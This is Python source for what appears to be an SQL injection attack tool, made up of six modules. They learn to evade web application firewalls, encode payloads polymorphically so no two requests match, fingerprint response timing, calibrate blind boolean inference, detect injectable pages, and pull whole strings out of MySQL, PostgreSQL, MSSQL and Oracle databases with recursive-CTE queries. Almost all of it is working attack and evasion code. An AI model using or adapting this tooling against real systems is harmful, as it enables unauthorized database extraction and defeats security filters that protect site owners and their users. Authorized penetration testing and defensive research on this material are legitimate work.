#  v23-1: Adversarial ML Payload Generator 

class AdversarialPayloadGenerator:
    """Treats WAF bypass as adversarial ML. Maintains a discriminator trained
    on (payloadblocked/passed) history, then generates payloads that minimize
    predicted block probability. Converges on bypass in 20-50 iterations.
    """

    def __init__(self):
        self._history: List[Tuple[List[float], bool]] = []  # (features, blocked)
        self._weights: List[float] = [0.0] * 8  # logistic regression weights
        self._bias = 0.0
        self.request_count = 0

    def _featurize(self, payload: str) -> List[float]:
        """Extract feature vector from payload."""
        kw_count = sum(1 for kw in ["SELECT","UNION","AND","OR","FROM","WHERE","SLEEP"]
                       if kw in payload.upper())
        return [
            len(payload) / 200.0,                           # normalized length
            kw_count / 7.0,                                  # keyword density
            payload.count('%') / max(len(payload), 1),       # encoding ratio
            payload.count("'") / max(len(payload), 1),       # quote ratio
            payload.count(' ') / max(len(payload), 1),       # space ratio
            sum(1 for c in payload if c.isupper()) / max(len(payload), 1),  # case ratio
            payload.count('/*') / max(len(payload), 1),      # comment ratio
            len(set(payload)) / max(len(payload), 1),        # entropy proxy
        ]

    def _sigmoid(self, x: float) -> float:
        return 1.0 / (1.0 + math.exp(-max(-500, min(500, x))))

    def _predict_block_prob(self, features: List[float]) -> float:
        """Predict probability of WAF blocking this payload."""
        z = self._bias + sum(w * f for w, f in zip(self._weights, features))
        return self._sigmoid(z)

    def record(self, payload: str, blocked: bool):
        """Record a probe result to train the discriminator."""
        features = self._featurize(payload)
        self._history.append((features, blocked))
        self._train_step(features, blocked)

    def _train_step(self, features: List[float], blocked: bool, lr: float = 0.1):
        """Single gradient descent step on logistic regression."""
        pred = self._predict_block_prob(features)
        error = (1.0 if blocked else 0.0) - pred
        for i in range(len(self._weights)):
            self._weights[i] += lr * error * features[i]
        self._bias += lr * error

    def generate_evasive(self, base_payload: str, n_variants: int = 10) -> List[str]:
        """Generate payload variants that minimize predicted block probability."""
        variants = []
        mutations = [
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace(" ", "\t"),
            lambda p: re.sub(r'\b(SELECT|AND|OR|FROM|WHERE)\b',
                             lambda m: ''.join(random.choice([c.upper(), c.lower()])
                                               for c in m.group()), p, flags=re.I),
            lambda p: p.replace("'", "\\'" if random.random() > 0.5 else "''"),
            lambda p: re.sub(r'(?<!\.)\b(\d+)\b(?!\.)', lambda m: f"({m.group()}+0)", p, count=1),
            lambda p: p.replace("AND", "&&") if "AND" in p.upper() else p,
            lambda p: p.replace("=", " LIKE ") if random.random() > 0.5 else p,
            lambda p: p[:len(p)//2] + "/**/" + p[len(p)//2:],
        ]

        for _ in range(n_variants * 3):
            p = base_payload
            for _ in range(random.randint(1, 4)):
                p = random.choice(mutations)(p)
            if p != base_payload and p not in variants:
                variants.append(p)
            if len(variants) >= n_variants:
                break

        # Sort by predicted block probability (lowest first)
        variants.sort(key=lambda p: self._predict_block_prob(self._featurize(p)))
        return variants[:n_variants]


#  v23-2: Response-Time Distribution Fingerprinting 

class ResponseTimingFingerprint:
    """Builds KDE (Kernel Density Estimation) of response times and uses
    Kolmogorov-Smirnov test for distribution-level timing detection.
    """

    def __init__(self):
        self.baseline_times: List[float] = []
        self.probe_times: List[float] = []

    def add_baseline(self, elapsed_ms: float):
        self.baseline_times.append(elapsed_ms)

    def add_probe(self, elapsed_ms: float):
        self.probe_times.append(elapsed_ms)

    def ks_test(self) -> Tuple[float, bool]:
        """Two-sample Kolmogorov-Smirnov test. Returns (statistic, significant)."""
        if len(self.baseline_times) < 3 or len(self.probe_times) < 3:
            return 0.0, False
        # Sort both samples
        b = sorted(self.baseline_times)
        p = sorted(self.probe_times)
        n1, n2 = len(b), len(p)

        # Compute KS statistic
        all_vals = sorted(set(b + p))
        max_diff = 0.0
        for v in all_vals:
            ecdf_b = sum(1 for x in b if x <= v) / n1
            ecdf_p = sum(1 for x in p if x <= v) / n2
            max_diff = max(max_diff, abs(ecdf_b - ecdf_p))

        # Critical value at p=0.05
        c_alpha = 1.36 * math.sqrt((n1 + n2) / (n1 * n2))
        significant = max_diff > c_alpha

        return max_diff, significant

    def wasserstein_distance(self) -> float:
        """Earth Mover's Distance between baseline and probe distributions."""
        if not self.baseline_times or not self.probe_times:
            return 0.0
        b = sorted(self.baseline_times)
        p = sorted(self.probe_times)
        # Approximate via sorted sample comparison
        n = min(len(b), len(p))
        b_interp = [b[int(i * len(b) / n)] for i in range(n)]
        p_interp = [p[int(i * len(p) / n)] for i in range(n)]
        return sum(abs(bi - pi) for bi, pi in zip(b_interp, p_interp)) / n


#  v23-3: Recursive CTE-Based Extraction 

class RecursiveCTEExtractor:
    """Uses WITH RECURSIVE to extract entire strings server-side in 1 query.
    The database itself iterates and concatenates  1 request per string.
    """

    CTE_TEMPLATES: Dict[str, str] = {
        "MySQL": (
            "WITH RECURSIVE r AS ("
            "SELECT 1 i, SUBSTRING(({q}),1,1) c "
            "UNION ALL SELECT i+1, SUBSTRING(({q}),i+1,1) FROM r WHERE i<LENGTH(({q})))"
            " SELECT GROUP_CONCAT(c ORDER BY i SEPARATOR '') FROM r"),
        "PostgreSQL": (
            "WITH RECURSIVE r AS ("
            "SELECT 1 i, SUBSTRING(({q}),1,1) c "
            "UNION ALL SELECT i+1, SUBSTRING(({q}),i+1,1) FROM r WHERE i<LENGTH(({q})))"
            " SELECT string_agg(c,'' ORDER BY i) FROM r"),
        "MSSQL": (
            "WITH r AS ("
            "SELECT 1 i, SUBSTRING(({q}),1,1) c "
            "UNION ALL SELECT i+1, SUBSTRING(({q}),i+1,1) FROM r WHERE i<LEN(({q})))"
            " SELECT STRING_AGG(c,'') WITHIN GROUP(ORDER BY i) FROM r OPTION(MAXRECURSION 0)"),
        "Oracle": (
            "WITH r(i,c) AS ("
            "SELECT 1, SUBSTR(({q}),1,1) FROM DUAL "
            "UNION ALL SELECT i+1, SUBSTR(({q}),i+1,1) FROM r WHERE i<LENGTH(({q})))"
            " SELECT LISTAGG(c,'') WITHIN GROUP(ORDER BY i) FROM r"),
    }

    @classmethod
    def build_cte_query(cls, sql_query: str, dbms: str) -> Optional[str]:
        """Build recursive CTE extraction query."""
        tmpl = cls.CTE_TEMPLATES.get(dbms)
        if tmpl:
            return tmpl.format(q=sql_query)
        return None


#  v23-4: Negative-Space Detection 

class NegativeSpaceDetector:
    """Detects injection by finding what DISAPPEARS from responses.
    Catches silent-failure injections where apps return fewer results.
    """

    @staticmethod
    def count_content_elements(html: str) -> Dict[str, int]:
        """Count structural content elements in HTML."""
        return {
            "total_length": len(html),
            "words": len(html.split()),
            "tags": len(re.findall(r'<\w+', html)),
            "rows": html.lower().count('<tr'),
            "list_items": html.lower().count('<li'),
            "links": html.lower().count('<a '),
            "images": html.lower().count('<img'),
            "divs": html.lower().count('<div'),
            "paragraphs": html.lower().count('<p'),
            "inputs": html.lower().count('<input'),
            "json_keys": html.count('":'),
        }

    @classmethod
    def detect_disappearance(cls, baseline_body: str,
                                true_body: str,
                                false_body: str) -> Dict:
        """Detect content disappearance between true/false conditions."""
        base_counts = cls.count_content_elements(baseline_body)
        true_counts = cls.count_content_elements(true_body)
        false_counts = cls.count_content_elements(false_body)

        signals = {}
        for key in base_counts:
            t_val = true_counts[key]
            f_val = false_counts[key]
            b_val = base_counts[key]
            if b_val > 0:
                diff = abs(t_val - f_val)
                if diff > 0 and diff / max(b_val, 1) > 0.05:
                    signals[key] = {
                        "baseline": b_val, "true": t_val,
                        "false": f_val, "diff_ratio": diff / b_val,
                    }

        is_injectable = len(signals) >= 2 or any(
            s["diff_ratio"] > 0.2 for s in signals.values())

        return {
            "injectable": is_injectable,
            "signals": signals,
            "confidence": min(0.95, 0.4 + 0.1 * len(signals)),
        }


#  v23-5: Polymorphic Self-Modifying Payload Encoder 

class PolymorphicEncoder:
    """Generates polymorphic payloads  each instance has different encoding
    but executes identically. No two requests ever share the same bytes.
    """

    @classmethod
    def encode(cls, payload: str, layers: int = 3) -> str:
        """Apply random polymorphic encoding layers."""
        p = payload
        layer_fns = [
            cls._random_comments,
            cls._random_case,
            cls._random_whitespace,
            cls._numeric_obfuscation,
            cls._concat_split,
        ]
        chosen = random.sample(layer_fns, min(layers, len(layer_fns)))
        for fn in chosen:
            p = fn(p)
        return p

    @staticmethod
    def _random_comments(p: str) -> str:
        """Insert random-content comments between characters of keywords."""
        keywords = re.findall(r'\b(SELECT|UNION|AND|OR|FROM|WHERE|INSERT|UPDATE|DELETE)\b', p, re.I)
        for kw in set(keywords):
            rand_content = ''.join(random.choices(string.ascii_letters, k=random.randint(2, 8)))
            commented = kw[0] + f"/*{rand_content}*/" + kw[1:]
            p = p.replace(kw, commented, 1)
        return p

    @staticmethod
    def _random_case(p: str) -> str:
        return re.sub(r'[a-zA-Z]', lambda m: m.group().upper() if random.random() > 0.5
                      else m.group().lower(), p)

    @staticmethod
    def _random_whitespace(p: str) -> str:
        ws = [" ", "\t", "\n", "%09", "%0a", "%0d", "/**/", " "*2]
        return re.sub(r' ', lambda _: random.choice(ws), p)

    @staticmethod
    def _numeric_obfuscation(p: str) -> str:
        def obfuscate_num(m):
            n = m.group()
            choices = [n, f"({n}+0)", f"({n}*1)", f"({n}|0)",
                       f"CHAR({ord(n)})" if len(n) == 1 else n]
            return random.choice(choices)
        return re.sub(r'\b(\d)\b', obfuscate_num, p)

    @staticmethod
    def _concat_split(p: str) -> str:
        """Split a string literal into CONCAT pieces."""
        m = re.search(r"'([^']{4,})'", p)
        if m:
            s = m.group(1)
            mid = len(s) // 2
            replacement = f"CONCAT('{s[:mid]}','{s[mid:]}')"
            return p[:m.start()] + replacement + p[m.end():]
        return p


#  v23-6: Adaptive Boolean Threshold Calibration 

class BlindBoolCalibrator:
    """Dynamically calibrates the boolean similarity threshold per target
    by sending known-true and known-false conditions at scan start.
    """

    def __init__(self):
        self.true_sims: List[float] = []
        self.false_sims: List[float] = []
        self.threshold: float = 0.65  # default fallback
        self._polarity_inverted: bool = False

    def record_true(self, similarity: float):
        self.true_sims.append(similarity)
        self._recalculate()

    def record_false(self, similarity: float):
        self.false_sims.append(similarity)
        self._recalculate()

    def update(self, similarity: float, is_true: bool) -> None:
        """Unified update method: routes to record_true or record_false by polarity."""
        if is_true:
            self.record_true(similarity)
        else:
            self.record_false(similarity)

    def _recalculate(self):
        """Set threshold at optimal decision boundary."""
        if not self.true_sims or not self.false_sims:
            return
        mean_t = sum(self.true_sims) / len(self.true_sims)
        mean_f = sum(self.false_sims) / len(self.false_sims)
        # Threshold at midpoint between means; track polarity for is_true()
        self.threshold = (mean_t + mean_f) / 2
        if mean_t > mean_f:
            self._polarity_inverted = False
        else:
            self._polarity_inverted = True
            LOG.debug(
                "[BlindBoolCalibrator] Inverted polarity (mean_t=%.3f <= mean_f=%.3f); "
                "using midpoint threshold %.3f with inverted comparison",
                mean_t, mean_f, self.threshold)

    def reset(self):
        """Reset calibrator to initial state between scan targets.

        BUG-BOOL-CAL-RESET FIX (Req 3): This singleton persists across scans.
        Without reset(), threshold calibrated on target A (e.g. 0.88) is reused
        for target B — rejecting real injections (too tight) or accepting FPs
        (too loose). Reset to defaults so each scan calibrates independently.
        Called by Scanner.run() and ScannerVFinal.run() at scan start.
        """
        self.true_sims.clear()
        self.false_sims.clear()
        self.threshold = 0.65
        self._polarity_inverted = False

    def is_true(self, similarity: float) -> bool:
        """Classify a similarity score using calibrated threshold."""
        if getattr(self, '_polarity_inverted', False):
            return similarity < self.threshold
        return similarity >= self.threshold


